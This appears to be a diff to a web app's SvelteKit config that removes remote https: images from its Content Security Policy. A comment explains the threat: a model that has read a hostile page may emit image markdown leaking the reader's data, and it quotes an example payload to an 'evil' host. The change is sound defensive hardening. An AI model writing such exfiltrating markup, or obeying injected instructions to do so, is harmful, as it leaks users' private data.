@@ -13,7 +13,7 @@ const config = {
 		// exists; nothing posts a form to this app cross-origin. A caller that is
 		// not a browser (a script, Playwright's request context) sends no Origin
 		// and must send its own. See docs/security-headers.md.
-		// tests/integration/csrf-config.test.ts fails if a wildcard comes back.
+		// tests/integration/svelte-config-security.test.ts fails if a wildcard comes back.
 
 		// Content Security Policy for rendered pages.
 		//
@@ -53,9 +53,19 @@ const config = {
 				'style-src': ['self', 'unsafe-inline'],
 				'style-src-attr': ['unsafe-inline'],
 				// data: for inline SVG/preview URIs, blob: for the image preview
-				// and the settings image pickers, https: because chat markdown
-				// embeds arbitrary remote images from model and search output.
-				'img-src': ['self', 'data:', 'blob:', 'https:'],
+				// and the settings image pickers. NOT https: any more. A picture
+				// the browser fetches is a request to whatever address the markup
+				// names, with no click, and model-written markup can carry the
+				// reader's data in that address (`![](https://evil/?q=<secret>)`);
+				// a model that has just read a hostile page may write exactly that.
+				// Every image the UI draws is same-origin: avatars, campaign and
+				// model icons, the favicon proxy (/api/favicon), the Immich
+				// thumbnail proxy, map tiles, chat files. A picture from the web
+				// reaches a chat reply only as one of the search tool's thumbnails,
+				// fetched by the server and served from
+				// /api/image-search/thumbnail, and anything else the model links
+				// shows as a link. See docs/security-headers.md.
+				'img-src': ['self', 'data:', 'blob:'],
 				// Every font is self-hosted woff2 under static/fonts. No Google Fonts.
 				'font-src': ['self'],
 				// Same-origin only: the browser never talks to a model provider,
